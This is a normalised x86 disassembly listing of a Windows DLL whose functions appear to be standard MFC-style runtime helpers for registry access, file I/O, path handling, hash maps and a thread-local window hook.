test eax eax
jne r-xdata
sub_10012e70
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov edi ebp
or ecx 0xffffffff
xor eax eax
xor esi esi
mov edx [ esp + 0x1c ]
[ edi ]
not ecx
dec ecx
cmp ecx edx
jae r-xdata
mov ebx [ esp + 0x14 ]
or ecx 0xffffffff
mov edi ebx
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ebp
mov eax ecx
or ecx 0xffffffff
mov [ esp + 0x1c ] eax
xor eax eax
[ edi ]
mov eax [ esp + 0x1c ]
not ecx
dec ecx
cmp eax ecx
jae r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
lea edi [ edx - 0x1 ]
test edi edi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ecx [ esp + 0x18 ]
movsx edx [ esi + ecx ]
push edx
call sub_10011860
mov ebp eax
movsx eax [ ebx ]
push eax
call sub_10011860
add esp 0x8
cmp eax ebp
je r-xdata
inc esi
xor esi esi
jmp r-xdata
cmp esi edi
jl r-xdata
mov al [ ebx + 0x1 ]
inc ebx
test al al
je r-xdata
sub_10012f10
push ecx
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
lea eax [ esp + 0xc ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x8 ]
push esi
mov [ esp + 0xc ] eax
push ecx
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x8 ]
push edx
mov edx [ esp + 0x18 ]
push eax
push 0x0
push ecx
push edx
mov [ esp + 0x1c ] 0x1
call [ RegQueryValueExA@IAT ]
mov esi eax
mov eax [ esp + 0x10 ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
pop ecx
retn
xor eax eax
pop ecx
retn
sub_10012f80
push esi
mov esi [ esp + 0xc ]
lea eax [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push 0xf003f
push 0x0
push esi
push edi
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
mov ecx [ esp + 0x14 ]
push edx
push 0x1
push eax
mov eax [ esp + 0x24 ]
push eax
push ecx
call [ RegSetValueExA@IAT ]
mov edx [ esp + 0x10 ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
xor eax eax
pop edi
test esi esi
sete al
pop esi
retn
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push 0x0
push 0xf003f
push 0x0
push r--data
push 0x0
push esi
push edi
mov [ esp + 0x30 ] 0x1
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
sub_10013020
push esi
mov esi [ esp + 0xc ]
lea eax [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push 0xf003f
push 0x0
push esi
push edi
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
lea eax [ esp + 0x18 ]
push 0x4
push eax
push 0x4
push 0x0
push ecx
push edx
call [ RegSetValueExA@IAT ]
mov esi eax
mov eax [ esp + 0x10 ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
pop edi
test esi esi
sete al
pop esi
retn
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push 0x0
push 0xf003f
push 0x0
push r--data
push 0x0
push esi
push edi
mov [ esp + 0x30 ] 0x1
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
sub_100130b0
push esi
mov esi ecx
push 0x80
lea eax [ esi + 0x14 ]
mov [ esi + 0xc ] 0x1
push eax
push [ esi + 0x94 ]
call sub_1001768d
neg eax
sbb eax eax
neg eax
mov [ esi + 0x10 ] eax
pop esi
retn
sub_100130d9
mov eax [ esp + 0xc ]
push esi
test eax eax
mov esi ecx
je r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
and [ eax ] 0x0
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx esi
call sub_100130b0
mov eax [ esp + 0x8 ]
and [ eax ] 0x0
push [ esp + 0xc ]
lea eax [ esi + 0x14 ]
push eax
push [ esp + 0x10 ]
call [ lstrcpynA@IAT ]
jmp r-xdata
mov eax [ esi + 0x10 ]
pop esi
retn 0xc
sub_10013135
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x1c ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
dec eax
mov esi ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffff894
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
call sub_10005159
mov [ esi ] eax
pop ecx
mov eax esi
pop esi
leave
retn 0x1c
sub_10013181
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov cx [ eax ]
cmp cx 0x76c
jae r-xdata
movzx edx [ eax + 0xc ]
push [ ebp + 0xc ]
push edx
movzx edx [ eax + 0xa ]
push edx
movzx edx [ eax + 0x8 ]
push edx
movzx edx [ eax + 0x6 ]
movzx eax [ eax + 0x2 ]
push edx
push eax
movzx eax cx
push eax
lea ecx [ ebp + 0x8 ]
call sub_10013135
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
and [ esi ] 0x0
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
sub_100131cd
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x8 ]
push esi
push eax
mov esi ecx
push [ ebp + 0x8 ]
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
jne r-xdata
mov eax esi
pop esi
leave
retn 0x8
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
lea ecx [ ebp + 0x8 ]
push eax
call sub_10013181
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
sub_10013219
push esi
mov esi ecx
push edi
xor edi edi
mov ecx [ esi + 0x14 ]
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
call sub_10013296
mov [ esi + 0x14 ] edi
pop edi
pop esi
retn
sub_10013252
mov eax [ ecx + 0x4 ]
push esi
mov edx [ eax ]
mov esi [ eax + 0x8 ]
test edx edx
mov [ ecx + 0x4 ] edx
je r-xdata
and [ ecx + 0x8 ] 0x0
and [ edx + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_10013239
mov eax esi
pop esi
retn
sub_100132ef
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x0
mov ebx [ esp + 0xc ]
je r-xdata
push eax
call sub_10014657
and [ esi + 0x4 ] 0x0
pop ecx
mov [ esi + 0x8 ] ebx
pop esi
pop ebx
retn 0x8
push edi
mov edi ebx
shl edi 0x2
push edi
call sub_1001462e
push edi
push 0x0
push eax
mov [ esi + 0x4 ] eax
call sub_10004940
add esp 0x10
pop edi
sub_10013334
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x14 ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
call sub_10013296
and [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call sub_10014657
and [ esi + 0x4 ] 0x0
pop ecx
sub_10013388
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
inc [ esi + 0xc ]
mov [ esi + 0x10 ] ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
pop esi
retn
push 0xc
lea eax [ esi + 0x14 ]
push [ esi + 0x18 ]
push eax
call sub_10013276
mov ecx [ esi + 0x18 ]
add eax 0x4
lea edx [ ecx + ecx * 2 ]
dec ecx
test ecx ecx
lea eax [ eax + edx * 4 - 0xc ]
jl r-xdata
inc ecx
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov [ esi + 0x10 ] eax
sub eax 0xc
dec ecx
jne r-xdata
sub_100133ee
push esi
mov esi [ esp + 0x8 ]
mov eax esi
xor edx edx
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esp + 0xc ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + edx * 4 ]
cmp [ eax + 0x4 ] esi
je r-xdata
pop esi
retn 0x8
mov eax [ eax ]
jmp r-xdata
test eax eax
je r-xdata
sub_10013420
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov edx [ esi + edx * 4 ]
cmp [ edx + 0x4 ] edi
je r-xdata
mov eax [ edx + 0x8 ]
jmp r-xdata
mov edx [ edx ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test edx edx
je r-xdata
sub_10013453
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
push edi
call sub_100133ee
test eax eax
jne r-xdata
pop edi
add eax 0x8
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x4 ] eax
jne r-xdata
mov ecx esi
call sub_10013388
mov [ eax + 0x4 ] edi
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx * 4 ] eax
push 0x1
mov ecx esi
push [ esi + 0x8 ]
call sub_100132ef
sub_100134a3
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esi + edx * 4 ]
lea edx [ esi + edx * 4 ]
cmp [ eax + 0x4 ] edi
je r-xdata
mov esi [ eax ]
push eax
mov [ edx ] esi
call sub_100133d5
push 0x1
pop eax
jmp r-xdata
mov edx eax
mov eax [ eax ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
sub_100134e5
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
cmp esi 0xffffffff
jne r-xdata
mov edi [ esi ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x8 ]
xor edi edi
test edx edx
jbe r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ ecx ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esi + 0x8 ]
pop edi
mov [ ecx ] eax
pop esi
retn 0xc
mov eax [ esi + 0x4 ]
push ebx
mov ebx [ ecx + 0x8 ]
xor edx edx
shr eax 0x4
div ebx
inc edx
cmp edx ebx
jae r-xdata
mov eax [ ecx + 0x4 ]
pop ebx
mov eax [ ecx + 0x4 ]
lea eax [ eax + edx * 4 ]
inc edi
add eax 0x4
cmp edi edx
jb r-xdata
inc edx
add eax 0x4
cmp edx ebx
jb r-xdata
mov esi [ eax ]
test esi esi
jne r-xdata
mov edi [ eax ]
test edi edi
jne r-xdata
sub_100135ac
mov eax sub_1001995b
call sub_10004904
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
cmp [ esi + 0x4 ] 0xffffffff
mov [ ebp - 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc ]
call sub_100144cd
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ esi + 0x8 ] 0x0
je r-xdata
call sub_10013884
sub_100135f4
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov ebx ecx
push 0x10
call sub_1001462e
test eax eax
pop ecx
je r-xdata
xor edi edi
push 0xffffffff
mov ecx eax
call sub_1001358d
mov edi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
pop edi
pop ebx
leave
retn
test edi edi
je r-xdata
push esi
mov esi [ GetCurrentProcess@IAT ]
push 0x2
push 0x0
lea eax [ ebp - 0x4 ]
push 0x0
push eax
call esi
push eax
push [ ebx + 0x4 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
pop esi
jne r-xdata
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_100146df
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0x4 ]
sub_10013669
push ebp
mov ebp esp
sub esp 0x110
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0xc ]
and [ esi + 0x8 ] 0x0
or [ esi + 0x4 ] 0xffffffff
lea ebx [ esi + 0xc ]
and edi 0xffff7fff
mov ecx ebx
call sub_10014458
push [ ebp + 0x8 ]
lea eax [ ebp - 0x110 ]
push eax
call sub_10013995
lea eax [ ebp - 0x110 ]
mov ecx ebx
push eax
call sub_10014576
mov eax edi
xor ecx ecx
and eax 0x3
sub eax ecx
je r-xdata
mov ecx 0x80000000
dec eax
je r-xdata
xor eax eax
cmp eax 0x10
je r-xdata
mov ecx 0x40000000
jmp r-xdata
dec eax
jne r-xdata
push 0x3
pop edi
and edi 0x2000
neg edi
sbb edi edi
and edi 0x2
inc edi
inc edi
jmp r-xdata
cmp eax 0x20
je r-xdata
mov eax edi
push 0x1
and eax 0x70
pop ebx
je r-xdata
mov ecx 0xc0000000
jmp r-xdata
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov eax ebx
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
push 0x0
push 0x80
lea edx [ ebp - 0xc ]
push edi
push edx
push eax
push ecx
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x30
je r-xdata
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
mov [ esi + 0xc ] eax
call sub_1001480b
push [ ebp + 0x8 ]
lea ecx [ esi + 0x10 ]
mov [ esi + 0x8 ] eax
call sub_10014576
and [ ebp - 0x8 ] 0x0
mov edx edi
not edx
shr edx 0x7
and edx ebx
mov [ ebp - 0xc ] 0xc
test edi 0x1000
mov [ ebp - 0x4 ] edx
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
pop eax
jmp r-xdata
push 0x3
sub_10013786
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
jne r-xdata
lea eax [ ebp + 0xc ]
push 0x0
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
call [ GetLastError@IAT ]
push eax
call sub_100146df
pop ebp
retn 0x8
sub_100137c0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
lea eax [ ebp + 0xc ]
push 0x0
push eax
push edi
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
push [ esi + 0xc ]
call [ GetLastError@IAT ]
push eax
call sub_100146df
push [ esi + 0xc ]
push 0xffffffff
push 0xd
call sub_100147a0
sub_1001380b
push esi
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ SetFilePointer@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax esi
pop esi
retn 0x8
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_100146df
sub_1001383a
push esi
push 0x1
push 0x0
push 0x0
push [ ecx + 0x4 ]
call [ SetFilePointer@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax esi
pop esi
retn
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_100146df
sub_10013884
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
or [ esi + 0x4 ] 0xffffffff
and [ esi + 0x8 ] 0x0
lea ecx [ esi + 0xc ]
call sub_10014458
test edi edi
pop edi
pop esi
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov edi eax
neg edi
sbb edi edi
inc edi
retn
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_100146df
sub_100138e5
push 0x0
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ LockFile@IAT ]
test eax eax
jne r-xdata
retn 0x8
push eax
call [ GetLastError@IAT ]
push eax
call sub_100146df
sub_1001390e
push 0x0
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ UnlockFile@IAT ]
test eax eax
jne r-xdata
retn 0x8
push eax
call [ GetLastError@IAT ]
push eax
call sub_100146df
sub_10013937
push esi
mov esi ecx
push 0x0
mov eax [ esi ]
push [ esp + 0xc ]
call [ eax + 0x28 ]
push [ esi + 0x4 ]
call [ SetEndOfFile@IAT ]
test eax eax
pop esi
jne r-xdata
retn 0x4
push eax
call [ GetLastError@IAT ]
push eax
call sub_100146df
sub_10013963
push ebx
push esi
mov esi ecx
push edi
push 0x1
push 0x0
mov eax [ esi ]
call [ eax + 0x28 ]
mov edi eax
mov eax [ esi ]
push 0x2
push 0x0
mov ecx esi
call [ eax + 0x28 ]
mov ebx eax
mov eax [ esi ]
push 0x0
push edi
mov ecx esi
call [ eax + 0x28 ]
pop edi
mov eax ebx
pop esi
pop ebx
retn
sub_10013995
mov eax sub_10019970
call sub_10004904
sub esp 0x14c
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
mov esi 0x104
push edi
push esi
push [ ebp + 0xc ]
call [ GetFullPathNameA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
xor esi esi
push eax
push edi
mov [ ebp - 0x4 ] esi
call sub_10013a65
push esi
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push esi
push esi
push [ ebp + 0x8 ]
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp + 0xc ]
push edi
call [ lstrcpynA@IAT ]
xor eax eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_100144cd
mov eax esi
test [ ebp - 0x10 ] 0x2
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
test [ ebp - 0x10 ] 0x4
jne r-xdata
push edi
call [ CharUpperA@IAT ]
push 0x1
pop esi
lea eax [ ebp - 0x158 ]
push eax
push [ ebp + 0xc ]
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
push eax
call [ FindClose@IAT ]
lea eax [ ebp - 0x12c ]
push eax
push [ ebp - 0x14 ]
call [ lstrcpyA@IAT ]
sub_10013a65
mov ecx [ esp + 0x8 ]
push ebx
push esi
mov esi 0x104
push edi
push esi
call sub_1001459d
xor ebx ebx
mov edi eax
push esi
push ebx
push edi
call sub_10004940
add esp 0xc
push esi
push [ esp + 0x14 ]
push edi
call [ lstrcpynA@IAT ]
mov cl [ edi ]
mov eax edi
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
mov cl [ edi ]
mov eax edi
inc eax
inc eax
mov cl [ eax + 0x1 ]
cmp cl 0x5c
je r-xdata
cmp cl 0x2f
jne r-xdata
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
cmp cl 0x2f
je r-xdata
push eax
call sub_10004923
pop ecx
mov cl [ eax ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
push 0xffffffff
call sub_100145ec
pop edi
pop esi
pop ebx
retn 0x8
mov [ eax + 0x1 ] bl
cmp cl 0x2f
je r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
push eax
call sub_10004923
pop ecx
cmp cl 0x2f
je r-xdata
cmp cl bl
je r-xdata
push eax
call sub_10004923
pop ecx
mov cl [ eax ]
jmp r-xdata
cmp cl 0x5c
je r-xdata
push eax
call sub_10004923
pop ecx
jmp r-xdata
cmp cl bl
je r-xdata
cmp cl 0x2f
jne r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
sub_10013b2b
push ebp
mov ebp esp
sub esp 0x104
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
mov esi edi
jne r-xdata
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call GetFileTitleA
test ax ax
je r-xdata
lea esi [ ebp - 0x104 ]
mov [ ebp + 0x10 ] 0x104
test edi edi
jne r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_10018f31
jmp r-xdata
xor eax eax
push esi
call [ lstrlenA@IAT ]
inc eax
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_10013b96
call sub_10018d2c
cmp [ eax + 0x14 ] 0x0
jne r-xdata
retn
push esi
call sub_10018afa
mov esi eax
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_10013c59
push 0xffffffff
call [ SetWindowsHookExA@IAT ]
push sub_10018387
mov ecx rw-data
mov [ esi + 0x30 ] eax
call sub_10018975
mov esi eax
cmp [ esi + 0x14 ] 0x0
je r-xdata
push sub_1001839c
mov ecx rw-data
call sub_100188b3
pop esi
call sub_10018d2c
push [ eax + 0x8 ]
call [ esi + 0x14 ]
sub_10013bf5
push esi
call sub_10013cb1
push 0xffffffff
call sub_10013cba
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov ecx [ rw-data ]
pop esi
test ecx ecx
je r-xdata
mov ecx rw-data
call sub_1001892a
mov esi eax
test esi esi
je r-xdata
retn 0x4
push 0x0
push [ esp + 0x8 ]
call sub_1001885a
mov ecx [ esi + 0xcc ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x58 ]
mov ecx [ esi + 0xcc ]
test ecx ecx
je r-xdata
and [ esi + 0xcc ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_10013c59
push esi
call sub_10018d2c
cmp [ eax + 0x14 ] 0x0
mov esi [ esp + 0x8 ]
jne r-xdata
push sub_10018322
mov ecx rw-data
call sub_100188b3
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push esi
push [ eax + 0x30 ]
call [ CallNextHookEx@IAT ]
test esi esi
jge r-xdata
call sub_10013b81
test eax eax
je r-xdata
cmp esi 0x8001
jne r-xdata
push [ esp + 0x10 ]
mov edx [ eax ]
mov ecx eax
push esi
call [ edx + 0x70 ]
jmp r-xdata
pop esi
retn 0xc
sub_10013cba
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_10018d52
mov ebx eax
xor esi esi
mov eax [ ebx + 0x10 ]
cmp eax esi
je r-xdata
xor eax eax
pop edi
cmp [ ebx + 0x10 ] eax
pop esi
pop ebx
setne al
pop ebp
retn 0x4
dec eax
cmp eax esi
mov [ ebx + 0x10 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
call sub_10018d2c
mov edi [ eax + 0x4 ]
push sub_10018322
mov ecx rw-data
call sub_100188b3
test edi edi
mov esi eax
je r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x20 ]
call sub_10013ed8
mov ecx [ ebx + 0x1c ]
call sub_10013ed8
mov ecx [ ebx + 0x18 ]
call sub_10013ed8
mov ecx [ ebx + 0x14 ]
call sub_10013ed8
mov ecx [ ebx + 0x24 ]
call sub_10013ed8
call sub_10013b81
cmp eax esi
je r-xdata
cmp [ edi + 0xb8 ] 0x0
je r-xdata
push eax
call sub_10004a5e
cmp eax [ edi + 0xb8 ]
pop ecx
jae r-xdata
mov eax [ eax + 0x54 ]
cmp eax esi
je r-xdata
mov eax [ esi + 0xc ]
and [ ebp + 0x8 ] 0x0
test eax eax
je r-xdata
push esi
push esi
call eax
push [ edi + 0xb8 ]
call sub_100049d2
test eax eax
pop ecx
mov [ esi + 0xc ] eax
jne r-xdata
push eax
call sub_10004a5e
push [ esi + 0xc ]
mov [ ebp + 0x8 ] eax
call sub_1000413e
pop ecx
pop ecx
cmp [ ebp + 0x8 ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_100049d2
pop ecx
mov [ esi + 0xc ] eax
sub_10013db4
mov eax sub_100199da
call sub_10004904
push ecx
push esi
mov esi ecx
push edi
push 0xa
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x10 ] esi
call sub_100132ac
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x20 ]
push 0x4
mov ecx edi
call sub_100132ac
push 0x0
push 0x7
mov ecx edi
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
call sub_100132ef
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x40 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x44 ] eax
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
sub_10013e19
mov eax sub_100199e4
call sub_10004904
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov esi ecx
jne r-xdata
push edi
lea ecx [ esi + 0x4 ]
call sub_10013420
test eax eax
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
lea ecx [ esi + 0x20 ]
push edi
call sub_10013420
test eax eax
je r-xdata
push sub_100179ac
call sub_1001461c
mov ecx [ esi + 0x3c ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] eax
call sub_10013f3d
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x40 ]
mov [ ecx + eax ] edi
add ecx eax
cmp [ esi + 0x44 ] 0x2
jne r-xdata
push edi
lea ecx [ esi + 0x20 ]
call sub_10013453
push [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] ebx
call sub_1001461c
mov eax [ esi + 0x40 ]
mov [ eax + ebx ] edi
add eax ebx
cmp [ esi + 0x44 ] 0x2
jne r-xdata
call sub_1001311c
mov [ ecx + 0x4 ] edi
jmp r-xdata
mov eax ebx
jmp r-xdata
mov [ eax + 0x4 ] edi
sub_10013ed8
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
leave
retn
mov eax [ esi + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
lea ecx [ esi + 0x20 ]
call sub_10013334
push edi
lea edi [ esi + 0x20 ]
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
and [ eax + 0x4 ] 0x0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
mov ecx edi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_100134e5
mov eax [ esi + 0x40 ]
add eax [ ebp - 0x4 ]
and [ eax ] 0x0
cmp [ esi + 0x44 ] 0x2
jne r-xdata
pop edi
sub_10013f3d
mov eax sub_10019a58
call sub_10004904
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
cmp [ ecx + 0xc ] eax
mov [ ebp - 0x10 ] esp
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] eax
call [ ecx + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
sub_10013f83
mov eax sub_10019a83
call sub_10004904
sub esp 0x120
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x12c ]
push esi
push eax
call sub_100140b6
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push 0x1
mov eax 0x100
pop esi
lea ecx [ ebp - 0x10 ]
push eax
push eax
mov [ ebp - 0x4 ] esi
call sub_1001459d
push eax
lea eax [ ebp - 0x11a ]
push eax
call sub_10018f31
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_100145ec
mov ecx [ ebp + 0x8 ]
